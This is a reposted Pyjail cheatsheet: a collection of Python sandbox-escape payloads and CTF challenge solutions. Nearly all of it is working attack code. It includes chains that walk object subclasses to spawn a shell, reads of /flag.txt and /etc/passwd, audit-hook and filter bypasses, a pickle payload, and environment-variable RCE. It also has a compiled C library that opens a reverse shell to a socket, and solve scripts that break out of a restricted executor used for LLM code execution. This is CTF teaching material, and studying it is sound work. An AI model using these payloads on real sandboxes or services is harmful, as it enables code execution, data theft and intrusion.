---
title: Pyjail Cheatsheet
toc: true
categories:
  - 技术
  - web
date: 2025-05-28 23:10:12
tags:
  - web安全

---



来源：原文页面。([Shirajuki](https://shirajuki.js.org/blog/pyjail-cheatsheet/))

------

# Pyjail Cheatsheet

> Notice: This document will be continuously updated.

*Published on the source page.* ([Shirajuki](https://shirajuki.js.org/blog/pyjail-cheatsheet/))

------

## Table of Contents

- Sinks
- retrieving builtins
- good to know built-in functions and methods
- subclasses
- popular modules
- Bypasses and payloads
- decorators
- unicode bypass
- audithook bypass
- assigning attributes and variables
- getting attributes
- running functions and methods without parenthesis
- deleting variables
- General stuff
- environment variables
- magic methods
- help
- format string
- zip confusion
- stable payloads
- finding sinks from modules
- generic classes / bullet points
- CTF
- References

------

## Sinks

### retrieving builtins

```py
# obtain builtins from a globally defined built-in functions
# https://docs.python.org/3/library/functions.html 
print.__self__
__build_class__.__self__
__import__.__self__

# obtain builtins from site-module constants
# https://docs.python.org/3/library/constants.html#constants-added-by-the-site-module 
help.__call__.__builtins__ # or __globals__
help.__repr__.__globals__["sys"] # can chain with sys.modules
license.__repr__.__builtins__ # or __globals__
license.__repr__.__globals__["sys"] # can chain with sys.modules

# obtain the builtins from a defined function 
func.__globals__['__builtins__']
(lambda:...).__globals__

# obtain builtins from generators
(_ for _ in ()).gi_frame.f_builtins
(_ for _ in ()).gi_frame.f_globals["__builtins__"]
(await _ for _ in ()).ag_frame.f_builtins
(await _ for _ in ()).ag_frame.f_globals["__builtins__"]
```

### good to know built-in functions and methods

```py
breakpoint() # pdb -> import os; os.system("sh")
exec(input()) # import os; os.system("sh")
eval(input()) # __import__("os").system("sh")
help() # less pager -> !/bin/sh 
help() # less pager -> :e/flag.txt

assert len(set( [ *open("/flag.txt"), open("/flag.txt").read(), set(open("/flag.txt")).pop() ] )) == 1

# to stderr 
int(*open("/flag.txt"))
float(*open("/flag.txt"))
complex(*open("/flag.txt"))

exit(set(open("/flag.txt")))
exit(*open("/flag.txt"))
open(*open("/flag.txt"))
compile(".","/flag.txt","exec")
raise Exception(*open("/flag.txt"))

# to stdout 
help(*open("/flag.txt"))
print(*open("/flag.txt")

# https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#read-file-with-builtins-help-and-license 
license._Printer__filenames = ['/flag.txt']; license()
# [license() for license._Printer__filenames in [['/flag.txt']]]
```

### subclasses

```py
# <class '_frozen_importlib.BuiltinImporter'>
().__class__.__mro__[1].__subclasses__()[104].load_module("os").system("sh");

# <class '_frozen_importlib_external.FileLoader'>
().__class__.__bases__[0].__subclasses__()[118].get_data(".", "/flag.txt")

# <class '_io._IOBase'> -> <class '_io._RawIOBase'> -> <class '_io.FileIO'>
().__class__.__mro__[1].__subclasses__()[111].__subclasses__()[0].__subclasses__()[0]("/flag.txt").read()

# <class 'os._wrap_close'>
().__class__.__mro__[1].__subclasses__()[137].__init__.__builtins__["__import__"]("os").system("sh")
().__class__.__mro__[1].__subclasses__()[137].__init__.__globals__["system"]("sh")
().__class__.__mro__[1].__subclasses__()[137].close.__globals__["system"]("sh")

# <class 'subprocess.Popen'>
().__class__.__mro__[1].__subclasses__()[262](["cat","/flag.txt"], stdout=-1).communicate()[0]

# <class 'abc.ABC'> -> <class 'abc.ABCMeta'>
().__class__.__mro__[1].__subclasses__()[129].__class__.register.__builtins__["__import__"]("os").system("sh")

# <class 'collections.Counter'>
{}.__class__.__subclasses__()[2].copy.__builtins__["__import__"]("os").system("sh")
{}.__class__.__subclasses__()[2].update.__builtins__["__import__"]("os").system("sh")

# <class 'generator'> - instance
(_ for _ in ()).gi_frame.f_globals["__loader__"].load_module("os").system("sh")
(_ for _ in ()).gi_frame.f_globals["__builtins__"].__import__("os").system("sh")

# <class 'async_generator'> - instance
(await _ for _ in ()).ag_frame.f_globals["_""_loader_""_"].load_module("os").system("sh")
(await _ for _ in ()).ag_frame.f_globals["_""_builtins_""_"].eval("_""_import_""_('os').system('sh')")
```

### popular modules

```py
# sys 
sys = __import__("sys")
io = open.__self__; sys = io.__loader__.load_module("sys")[-1]
builtins = print.__self__; sys = builtins.__loader__.create_module([builtins.__spec__ for builtins.__spec__.name in ["sys"]][0])
sys.modules["module_name"] # contains most of the builtin modules alongside frozen imports (https://docs.python.org/3/library/index.html)
sys.modules["os"].system("sh")
sys.breakpointhook() # same as breakpoint()
sys._getframe().f_globals["__builtins__"].__import__("os").system("sh")

# _io 
io = __import__("_io")
io = open.__self__
io.FileIO("/flag.txt").read()
io.open("/flag.txt").read()
io.open("/etc/passwd").buffer.raw.__class__("/flag.txt").read()

# numpy 
numpy.fromfile("/flag.txt", dtype=numpy.uint8)
numpy.rec.fromfile("/flag.txt", formats="i1")
numpy.loadtxt("/flag.txt") # stderr
numpy.savetxt("/tmp/exp", ["\\x80\\x04\\x95\\x18\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x02os\\x8c\\x06system\\x93\\x94\\x94h\\x01\\x8c\\x02sh\\x85R."], fmt='%s', encoding="latin-1") # any pickle to execute, ie: `pickora -c 'from os import system; system("sh")'`
numpy.load("/tmp/exp", allow_pickle=True) # https://numpy.org/doc/stable/reference/generated/numpy.load.html
```

------

## Bypasses and payloads

### decorators

```py
@exec
@input
def a():pass # or class a:pass

@print
@set
@open
@input
class a:...

@print\r@set\r@open\r@input\rclass\x0ca:pass
```

### unicode bypass

- reference: https://lingojam.com/ItalicTextGenerator

```py
# no ASCII
() # import os;os.system("/bin/sh")

# no ASCII letters, no double underscores, inside eval 
_＿＿_(()).system(()) # double underscore bypass by having underscore + unicode underscore (U+005F and similar U+FE33...)
# no ASCII letters, no double underscores, no builtins, inside eval
()._＿＿_._＿＿_[1]._＿＿_()[104]._("\\157\\163").("\\57\\142\\151\\156\\57\\163\\150")

# no ASCII letters, no double underscores, no builtins, no quotes/double quotes inside eval (>= python3.8)
[:=()._＿＿_,:=y[19],()._＿＿_._＿＿_[1]._＿＿_()[104]._([34]+).(+[56])]

# no double underscores, no builtins, no quotes/double quotes, no square brackets inside eval (>= python3.8)
(:=()._＿＿_,d:=()._＿dir＿_().__class__(d),:=.(19),._＿＿_(()._＿＿_._＿＿_).(1)._＿＿_().(104)._(.(33)+).(+.(54)))

# no double underscores, no builtins, no quotes/double quotes, no parenthesis inside eval, has existing object (>= python3.8)
class cobj:...
obj = cobj()
[d:=[]._＿doc＿_,o:=d[32],s:=d[17],h:=d[54],[obj[s+h] for obj._＿class＿_._＿getitem＿_ in [[obj[o+s] for obj._＿class＿_._＿getitem＿_ in [[+obj for obj._＿class＿_._＿pos＿_ in [[]._＿class＿_._＿mro＿_[1]._＿subclasses＿_]][0][104].load_module]][0].system]]]
```

### audithook bypass

```py
import sys, os
sys.addaudithook((lambda x: lambda *_: x(1))(os._exit))

# Note that most of the imports below would trigger the audit event if not already imported before setting up the audithook, see: https://github.com/python/cpython/issues/116840

# https://ur4ndom.dev/posts/2024-02-11-dicectf-quals-diligent-auditor/#fnref5
# https://github.com/python/cpython/issues/115322

import readline
readline.read_history_file("/flag.txt"), print(readline.get_history_item(1))

import _posixsubprocess
errpipe_read, errpipe_write = os.pipe()

# python 3.10, may differ in other versions
_posixsubprocess.fork_exec(["/bin/sh", "-c", "cat /flag.txt"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, errpipe_read, errpipe_write, False, False, None, None, None, -1, None)

import subprocess
errpipe_read, errpipe_write = os.pipe()
# python 3.10, may differ in other versions
subprocess._posixsubprocess.fork_exec(["/bin/sh", "-c", "cat /flag.txt"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, errpipe_read, errpipe_write, False, False, None, None, None, -1, None)

import multiprocessing.util # underlying uses _posixsubprocess
multiprocessing.util.spawnv_passfds(b"/bin/sh", ["/bin/sh", "-c", "cat /flag.txt"], [])

# More techniques at https://github.com/Nambers/python-audit_hook_head_finder
# + https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF%202024/calc
```

### assigning attributes and variables

```py
class cobj:...

# walrus operator (>= python3.8)
[a:=().__doc__, print(a)]

# lambda
(lambda a: print(a))(().__doc__) # note that argument names aren't part of co_names

# setattr 
setattr(cobj, "field", "value"), print(cobj.field)
cobj.__setattr__("field", "value"), print(cobj.field)

# list comprehension
[cobj for cobj.field in ["value"]], print(cobj.field)
[1 for cobj.field in ["value"]], print(cobj.field)
```

### getting attributes

```py
class cobj:...
obj = cobj()

# eval
# getattr
getattr(cobj, "field")
cobj.__getattribute__(cobj, "field")
obj.__getattribute__("field")

# vars() and |=
x = vars()
x |= vars(tuple) # add attributes of tuple into vars (concat) -> same as (x := x|vars(tuple))
l = *(y for y in list(vars()) if chr(98) in y), # ("__builtins__", "__getattribute__") - retrieve keys with underscore in name
b = __getitem__(l, 0) # __builtins__ - could have shorten into l[0] if [] is available
x |= vars(dict); bu = __getitem__(vars(), b) # <module 'builtins' (built-in)> - could have shorten into x[b] hereaswell
l = *(y for y in list(vars(bu)) if chr(98) in y and chr(97) in y and chr(112) in y and chr(75) not in y), # ("breakpoint") - retrieve "breakpoint"
x |= vars(tuple); brs = __getitem__(l, 0) # breakpoint 
x |= vars(dict)
br = __getitem__(vars(bu), brs) # <built-in function breakpoint>
br()

# exec
# match
match ():
    case object(_＿doc＿_=a):
      pass
print(a) # ().__doc__

# try...except 
try:
  "{0.__doc__.lol}".format(()) # format string by itself can also be used to leak values 
except Exception as e:
  a = e.obj
  print(a) # ().__doc__

# overwrite builtins 
__builtins__ = sys
__builtins__ = modules
__builtins__ = os
system("cat /flag.txt")
```

### running functions and methods without parenthesis

```py
class cobj:...
obj = cobj()

# list comprehension (exec & eval)
[+obj for obj.__class__.__pos__ in ["".__class__.__subclasses__]]

[obj["print(123)"] for obj.__class__.__getitem__ in [eval]]

# from builtin modules (exec & eval) - <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>
[f"{license}" for license._Printer__setup in [breakpoint]]
```

## deleting variables

------

```py
# try...except (exec)

delete_me = ""

try:
    p 
except Exception as delete_me:
    pass 
print(delete_me) # error

# del 

delete_me = ""
del delete_me 
print(delete_me) # error
```

------

## General stuff

### environment variables

- https://www.elttam.com/blog/env/#python
- `PYTHONINSPECT`, `PYTHONHOME`, `PYTHONPATH`, `PYTHONWARNINGS`, `BROWSER`
- `help.__repr__.__globals__["sys"].modules["os"].environ.__setitem__("PYTHONINSPECT", "1")`
- `help.__repr__.__builtins__["__import__"]('antigravity', help.__repr__.__builtins__["setattr"](help.__repr__.__builtins__["__import__"]('os'),'environ',{}.__class__(BROWSER='/bin/sh - c "cat /flag.txt" #%s')))`

### magic methods

- https://rszalski.github.io/magicmethods/#appendix1

### help

- use of pager (ie. less) to escape sandbox
- list modules by entering `modules`
- load modules by entering module names:
  - `__main__` – should already be loaded, help page shown if so
  - `pdb` – similar to importing pdb
  - `antigravity` – similar to importing antigravity
  - `PROGRAM_NAME` / `jail` / `app` – similar to importing and rerunning program if not wrapped in `if __name__ == "__main__":`
- `IPython.__main__` – for modules with nested package contents, importing them, i.e. `MODULE_NAME.CONTENT1.CONTENT2`, will also execute the code there given that `__name__` is not checked.
- note: loading modules would also add related imported classes to `object.__subclasses__()`
- see [SECCON Beginners CTF 2022: hitchhike4b](https://github.com)

```py
# load pdb from help in order to call breakpoint/pdb.set_trace() without __import__ in builtins
().__class__.__base__.__subclasses__()[158]()() # help()

pdb # load pdb into imported modules

app # the name of the main program in order to import / "rerun" the program

"".__class__.__base__.__subclasses__()[155].close.__globals__["sys"].modules["pdb"].set_trace() # sys.modules["pdb"].set_trace()

# overwrite BROWSER env for RCE through antigravity in help
[[1for __import__("os").environ["BROWSER"] in ['/bin/sh - c "cat /flag.txt" #%s']], help()]

antigravity
```

------

## format string

```markdown
# leak and access attributes with format string

import numpy 
import os 
from flask import Flask

app = Flask(__name__)
app.secret_key = 'SECRET'

class User():
    def __init__(self, id, username):
        self.id = id
        self.username = username
    def __repr__(self):
        return '<User {u.username} (id {{i.id}})>'.format(u=self).format(i=self)

user = User(0, '{i.__init__.__globals__[app].secret_key}')
print(user)

# on another, it is also possible to get RCE w/ file upload or write access if the ctypes module is loaded

# essentially, write .so / .dll file to system first and then load it as a c library for RCE

open("/tmp/lib.c", "wb").write(b"""#include <stdlib.h>\n__attribute__((constructor))\nvoid init() {\nsystem("python3 - c \\"import os; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('localhost', 1234)); fd = s.fileno(); os.dup2(fd, 0); os.dup2(fd, 1); os.dup2(fd, 2); os.system('/bin/sh')\\"");\n}""")
os.system("gcc - shared - fPIC /tmp/lib.c - o lib.so")
print("{0.__init__.__globals__[__loader__].load_module.__globals__[sys].modules[ctypes].cdll[/tmp/lib.so]}".format(user))
```

------

## zip confusion

- see https://github.com/python/cpython/issues/103051 & https://www.analogue.computer/blog/python-zip-confusion

------

## stable payloads

```py
# @salvatore-abello

().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["__import__"]("os").system("sh")
[].__class__.__subclasses__()[0].__init__.__builtins__["__import__"]("os").system("sh")
[].__class__.__subclasses__()[1].__hash__.__globals__["__import__"]("os").system("sh")

# if __import__ is in builtins

## type.__subclasses__(type)[0] -> <class 'abc.ABCMeta'>
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]()

## [].__reduce_ex__(3)[0] -> <function __newobj__ at 0x...>
[].__reduce_ex__(3)[0].__globals__["__builtins__"]["__import__"]("os").system("sh")
[].__reduce_ex__(3)[0].__builtins__["__import__"]("os").system("sh")
```

------

## finding sinks from modules

- https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&type=code
  - `__import__("ctypes")._aix.environ`
- https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Fimport+sys%2F&type=code
  - `__import__("_aix_support").sys`

------

## generic classes / bullet points

- `f"{65:c}"` can format an int to char (equivalent to `"%c" % 65 == chr(65) == "A"`)
- `"".encode().fromhex("41").decode()` parses hex into string
- `type`
  - `[].__class__.__class__`
  - `"".__class__.__class__`
- `object`
  - `[].__class__.__mro__[1]`
  - `[].__class__.__bases__[0]`
  - `[].__class__.__base__`
- `str`
  - `"".__class__`
  - `[].__doc__.__class__`
  - `[].__class__.__module__.__class__`
  - `0..hex().__class__`
  - `(0).__repr__.__class__`
- `tuple`
  - `[].__class__.__mro__.__class__`
  - `[].__class__.__bases__.__class__`
- `dict`
  - `{}.__class__`
  - `obj.__dict__.__class__`
  - `"".__class__.__dict__.copy().__class__`
- `class instances`:
  - `class cobj:...`
    - `obj = cobj()`
  - `type("cobj", (object,), {})()`
    - `[].__class__.__class__("cobj", [].__class__.__bases__.__class__([[].__class__.__base__]), {})()`

------

## CTF

### SECCON CTF 13: 1linepyjail

jail.py

```py
print(eval(code, {"__builtins__": None}, {}) if len(code := input("jail> ")) <= 100 and __import__("re").fullmatch(r'([^()]|\(\))*', code) else ":(")
```

solve.py

```py
# @Ark - rerun w/ help while adding pdb to loaded sys modules
"".__class__.__base__.__subclasses__()[141].__init__.__globals__["__builtins__"]["help"]()
pdb
jail
"".__class__.__base__.__subclasses__()[141].__init__.__globals__["sys"].modules["pdb"].set_trace()
"".__class__.__base__.__subclasses__()[141].__init__.__globals__["__builtins__"]["__import__"]("os").system("cat /flag-*.txt")

# @maple3142 - overwrite dunder to call breakpoint
[c:={}.__class__.__subclasses__()[2],b:=c.copy.__builtins__,[-c() for c.items in[b['breakpoint']]]]

# @nagi - calls code.interact() from object.__subclasses__ after triggering pydoc once w/ module containing code.InteractiveInterpreter
[s := ().__class__.__base__.__subclasses__, s()[158]()(), s()[-3].write.__globals__["interact"]()]
code
q
# @keymoon - retrieve help from <class 'enum._EnumDict'>
{}.__class__.__subclasses__()[3].update.__globals__['bltns'].help()
# and then similar to the above: pdb, jail -> pdb.set_trace() -> os.system
```

### idekCTF 2024: crator

```py
sandbox.py

builtins_whitelist = set(
    (
        "RuntimeError",
        "Exception",
        "KeyboardInterrupt",
        "False",
        "None",
        "True",
        "bytearray",
        "bytes",
        "dict",
        "float",
        "int",
        "list",
        "object",
        "set",
        "str",
        "tuple",
        "abs",
        "all",
        "any",
        "apply",
        "bin",
        "bool",
        "buffer",
        "callable",
        "chr",
        "classmethod",
        "cmp",
        "coerce",
        "compile",
        "delattr",
        "dir",
        "divmod",
        "enumerate",
        "filter",
        "format",
        "hasattr",
        "hash",
        "hex",
        "id",
        "input",
        "isinstance",
        "issubclass",
        "iter",
        "len",
        "map",
        "max",
        "min",
        "next",
        "oct",
        "open",
        "ord",
        "pow",
        "print",
        "property",
        "range",
        "reduce",
        "repr",
        "reversed",
        "round",
        "setattr",
        "slice",
        "sorted",
        "staticmethod",
        "sum",
        "super",
        "unichr",
        "xrange",
        "zip",
        "len",
        "sort",
    )
)

class ReadOnlyBuiltins(dict):
    def clear(self):
        raise RuntimeError("Nein")
    def __delitem__(self, key):
        raise RuntimeError("Nein")
    def pop(self, key, default=None):
        raise RuntimeError("Nein")
    def popitem(self):
        raise RuntimeError("Nein")
    def setdefault(self, key, value):
        raise RuntimeError("Nein")
    def __setitem__(self, key, value):
        raise RuntimeError("Nein")
    def update(self, dict, **kw):
        raise RuntimeError("Nein")

def _safe_open(open, submission_id):
    def safe_open(file, mode="r"):
        if mode != "r":
            raise RuntimeError("Nein")
        file = str(file)
        if file.endswith(submission_id + ".expected"):
            raise RuntimeError("Nein")
        return open(file, "r")
    return safe_open

class Sandbox(object):
    def __init__(self, submission_id):
        import sys
        from ctypes import pythonapi, POINTER, py_object
        _get_dict = pythonapi._PyObject_GetDictPtr
        _get_dict.restype = POINTER(py_object)
        _get_dict.argtypes = [py_object]
        del pythonapi, POINTER, py_object

        def dictionary_of(ob):
            dptr = _get_dict(ob)
            return dptr.contents.value
        type_dict = dictionary_of(type)
        del type_dict["__bases__"]
        del type_dict["__subclasses__"]

        original_builtins = sys.modules["__main__"].__dict__["__builtins__"].__dict__
        original_builtins["open"] = _safe_open(open, submission_id)
        for builtin in list(original_builtins):
            if builtin not in builtins_whitelist:
                del sys.modules["__main__"].__dict__["__builtins__"].__dict__[builtin]
        safe_builtins = ReadOnlyBuiltins(original_builtins)
        sys.modules["__main__"].__dict__["__builtins__"] = safe_builtins
        if hasattr(sys.modules["__main__"], "__file__"):
            del sys.modules["__main__"].__file__
        if hasattr(sys.modules["__main__"], "__loader__"):
            del sys.modules["__main__"].__loader__
        for key in [
            "__loader__",
            "__spec__",
            "origin",
            "__file__",
            "__cached__",
            "ReadOnlyBuiltins",
            "Sandbox",
        ]:
            if key in sys.modules["__main__"].__dict__["__builtins__"]["open"].__globals__:
                del sys.modules["__main__"].__dict__["__builtins__"]["open"].__globals__[key]
```

### UIUCTF 2024: ASTea

```py
chall.py

import ast

def safe_import():
  print("Why do you need imports to make tea?")

def safe_call():
  print("Why do you need function calls to make tea?")

class CoolDownTea(ast.NodeTransformer):
  def visit_Call(self, node: ast.Call) -> ast.AST:
    return ast.Call(func=ast.Name(id='safe_call', ctx=ast.Load()), args=[], keywords=[])
  def visit_Import(self, node: ast.Import) -> ast.AST:
    return ast.Expr(value=ast.Call(func=ast.Name(id='safe_import', ctx=ast.Load()), args=[], keywords=[]))
  def visit_ImportFrom(self, node: ast.ImportFrom) -> ast.AST:
    return ast.Expr(value=ast.Call(func=ast.Name(id='safe_import', ctx=ast.Load()), args=[], keywords=[]))
  def visit_Assign(self, node: ast.Assign) -> ast.AST:
    return ast.Assign(targets=node.targets, value=ast.Constant(value=0))
  def visit_BinOp(self, node: ast.BinOp) -> ast.AST:
    return ast.BinOp(left=ast.Constant(0), op=node.op, right=ast.Constant(0))

code = input('Nothing is quite like a cup of tea in the morning: ').splitlines()[0]
cup = ast.parse(code)
cup = CoolDownTea().visit(cup)
ast.fix_missing_locations(cup)
exec(compile(cup, '', 'exec'), {'__builtins__': {}}, {'safe_import': safe_import, 'safe_call': safe_call})
solve.py
# (a:=lambda:..., b:=safe_import.__builtins__["help"]); a.__globals__["__builtins__"] |= {"safe_import": safe_import, "safe_call": safe_call, "help": b}; [help["sh"] for help.__class__.__getitem__ in [help["os"].system for help.__class__.__getitem__ in [safe_import.__builtins__["__import__"]]]]

__builtins__ |= safe_import.__builtins__;
[help["sh"] for help.__class__.__getitem__ in [help["os"].system for help.__class__.__getitem__ in [safe_import.__builtins__["__import__"]]]]
```

### vsCTF 2024: llama-jail-revenge

```py
chall.py

#!/usr/local/bin/python
from exec_utils import safe_exec

def my_safe_exec(__source):
    # even MORE safe, surely nothing you can do now!!!
    assert __source.isascii(), "ascii check failed"
    blacklist = ["match", "case", "async", "def", "class", "frame", "_", "byte", "coding"]
    for x in blacklist:
        assert x not in __source, f"{x} is banned"
    return safe_exec(__source)

if __name__ == "__main__":
    __source = ""
    print("Enter code: ")
    try:
        while (inp := input()) != "#EOF":
            __source += inp + "\n"
    except EOFError:
        pass
    try:
        my_safe_exec(__source)
    except AssertionError as err:
        print(err)
exec_utils.py

# code from https://github.com/run-llama/llama_index/blob/35afb6b93476ef4f4d61a48d847cd0b191ac5cb6/llama-index-experimental/llama_index/experimental/exec_utils.py
import ast
import copy
from types import CodeType, ModuleType
from typing import Any, Dict, Mapping, Sequence, Union

ALLOWED_IMPORTS = {
    "math",
    "time",
    "datetime",
    "pandas",
    "numpy",
    "matplotlib",
    "plotly",
    "seaborn",
}

def _restricted_import(
    name: str,
    globals: Union[Mapping[str, object], None] = None,
    locals: Union[Mapping[str, object], None] = None,
    fromlist: Sequence[str] = (),
    level: int = 0,
) -> ModuleType:
    if name in ALLOWED_IMPORTS:
        return __import__(name, globals, locals, fromlist, level)
    raise ImportError(f"Import of module '{name}' is not allowed")

ALLOWED_BUILTINS = {
    "abs": abs,
    "all": all,
    "any": any,
    "ascii": ascii,
    "bin": bin,
    "bool": bool,
    "bytearray": bytearray,
    "bytes": bytes,
    "chr": chr,
    "complex": complex,
    "divmod": divmod,
    "enumerate": enumerate,
    "filter": filter,
    "float": float,
    "format": format,
    "frozenset": frozenset,
    "hash": hash,
    "hex": hex,
    "int": int,
    "isinstance": isinstance,
    "issubclass": issubclass,
    "iter": iter,
    "len": len,
    "list": list,
    "map": map,
    "max": max,
    "min": min,
    "next": next,
    "oct": oct,
    "open": open,
    "ord": ord,
    "pow": pow,
    "print": print,
    "range": range,
    "repr": repr,
    "reversed": reversed,
    "round": round,
    "set": set,
    "slice": slice,
    "sorted": sorted,
    "staticmethod": staticmethod,
    "sum": sum,
    "tuple": tuple,
    "type": type,
    "zip": zip,
    "len": len,
    "str": str,
    # Constants
    "True": True,
    "False": False,
    "None": None,
    "__import__": _restricted_import,
}

def _get_restricted_globals(__globals: Union[dict, None]) -> Any:
    restricted_globals = copy.deepcopy(ALLOWED_BUILTINS)
    if __globals:
        restricted_globals.update(__globals)
    return restricted_globals

vulnerable_code_snippets = [
    "os.",
]

class DunderVisitor(ast.NodeVisitor):
    def __init__(self) -> None:
        self.has_access_to_private_entity = False
        self.has_access_to_disallowed_builtin = False
        builtins = globals()["__builtins__"].keys()
        self._builtins = builtins
    def visit_Name(self, node: ast.Name) -> None:
        if node.id.startswith("_"):
            self.has_access_to_private_entity = True
        if node.id not in ALLOWED_BUILTINS and node.id in self._builtins:
            self.has_access_to_disallowed_builtin = True
        self.generic_visit(node)
    def visit_Attribute(self, node: ast.Attribute) -> None:
        if node.attr.startswith("_"):
            self.has_access_to_private_entity = True
        if node.attr not in ALLOWED_BUILTINS and node.attr in self._builtins:
            self.has_access_to_disallowed_builtin = True
        self.generic_visit(node)

def _contains_protected_access(code: str) -> bool:
    # do not allow imports
    imports_modules = False
    tree = ast.parse(code)
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imports_modules = True
        elif isinstance(node, ast.ImportFrom):
            imports_modules = True
        else:
            continue
    dunder_visitor = DunderVisitor()
    dunder_visitor.visit(tree)
    for vulnerable_code_snippet in vulnerable_code_snippets:
        if vulnerable_code_snippet in code:
            dunder_visitor.has_access_to_disallowed_builtin = True
    return (
        dunder_visitor.has_access_to_private_entity
        or dunder_visitor.has_access_to_disallowed_builtin
        or imports_modules
    )

def _verify_source_safety(__source: Union[str, bytes, CodeType]) -> None:
    """
    Verify that the source is safe to execute. For now, this means that it
    does not contain any references to private or dunder methods.
    """
    if isinstance(__source, CodeType):
        raise RuntimeError("Direct execution of CodeType is forbidden!")
    if isinstance(__source, bytes):
        __source = __source.decode()
    if _contains_protected_access(__source):
        raise RuntimeError(
            "Execution of code containing references to private or dunder methods, "
            "disallowed builtins, or any imports, is forbidden!"
        )

def safe_eval(
    __source: Union[str, bytes, CodeType],
    __globals: Union[Dict[str, Any], None] = None,
    __locals: Union[Mapping[str, object], None] = None,
) -> Any:
    _verify_source_safety(__source)
    return eval(__source, _get_restricted_globals(__globals), __locals)

def safe_exec(
    __source: Union[str, bytes, CodeType],
    __globals: Union[Dict[str, Any], None] = None,
    __locals: Union[Mapping[str, object], None] = None,
) -> None:
    _verify_source_safety(__source)
    return exec(__source, _get_restricted_globals(__globals), __locals)
```

### TFC CTF 2023: My Third Calculator

```py
server.py

import sys
print("This is a safe calculator")
inp = input("Formula: ")

sys.stdin.close()

blacklist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ."
if any(x in inp for x in blacklist):
    print("Nice try")
    exit()

fns = {
    "__builtins__": {"setattr": setattr, "__import__": __import__, "chr": chr}
}
print(eval(inp, fns, fns))
solve.py
# [setattr(__import__('os'), 'environ', {'BROWSER': '/bin/sh - c "cat /flag" #%s'}), __import__('antigravity')]

[(____('\157\163'), '\145\156\166\151\162\157\156', {'\102\122\117\127\123\105\122':'\57\142\151\156\57\163\150\40\55\143\40\42\143\141\164\40\57\146\154\141\147\42\40\43\45\163'}), ____('\141\156\164\151\147\162\141\166\151\164\171')]
```

### Equinor CTF 2023: Dis is it!

```py
main.py

from flask import Flask, request, redirect, send_from_directory
import dis
import io
import contextlib
import os
import datetime

app = Flask(__name__)

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/report/<path:filename>')
def serve_reports(filename):
    res = send_from_directory('./reports/', filename)
    res.headers['Content-Disposition'].pop('Content-Disposition', None)
    res.headers['Content-Type'] = 'text/plain'
    return res

@app.route('/api/disassemble', methods=['POST'])
def disassemble():
    report_name = request.files['source'].filename
    source = request.files['source'].stream.read()
    if os.path.exists('./reports/' + report_name):
        return redirect('/report/' + report_name)
    report = io.StringIO()
    with contextlib.redirect_stdout(report):
        print('-')
        print('Report for', report_name)
        print('Report date:', datetime.datetime.now())
        print('-')
        try:
            code = compile(source, '<string>', 'exec')
            dis.dis(code)
        except SyntaxError as e:
            print('Error:', e)
        print('-')
        print('Source code:')
        print('-')
    with open('./reports/' + report_name, 'w') as file:
        width = max(60, max(len(line) for line in report.getvalue().split('\n')))
        for line in report.getvalue().strip().split('\n'):
            line = line.ljust(width) if line != '-' else '-' * width
            file.write('# ' + line + ' #\n')
        file.write(source.decode())
    return redirect('/report/' + report_name)
```

### 37C3 Potluck CTF: tacocat

```py
main.py

while True:
    x = input("palindrome? ")
    assert "#" not in x, "comments are bad"
    assert all(ord(i) < 128 for i in x), "ascii only kthx"
    print(x, x[::-1])
    assert x == x[::-1], "not a palindrome"
    assert len(x) < 36, "palindromes can't be more than 35 characters long, this is a well known fact."
    #assert sum(x.encode()) % 256 == 69, "not nice!"
    #)"!ecin ton" ,96 == 652 % ))(edocne.x(mus tressa
    #".tcaf nwonk llew a si siht ,gnol sretcarahc 53 naht erom eb t'nac semordnilap" ,63 < )x(nel tressa
    #)"xhtk ylno iicsa" ,)x ni i orf 821 < )i(dro(lla tressa
    #)"dab era stnemmoc" ,x ni ton "#" tressa
solve.py

# setting up template for generating palindromes
alph = "abcdefghijklmnopqrstvwyzABCDEFGHIJKLMNOPQRSTVWYZ1234567890!\"#¤%&/()=?@$€{[]}"
dd = r"""'START\',)"CHAR"=:VAR1(,',(VAR1:="CHAR"),'\\START'"""
ff = r"""'START\',)"CHAR"+VAR2=:VAR1(,',(VAR1:=VAR2+"CHAR"),'\\START'"""
gg = r"""'START\',))VAR1(lave(,',(eval(VAR1)),'\\START'"""
ch = [dd,ff,gg]
payload = """eval(input());"""
out = []
var = var2 = "C"
while "}" not in flag:
    for guess in alph:
        # ...
        # (此处省略中间部分)
        pass
    # 验证 payload
    # ...
```

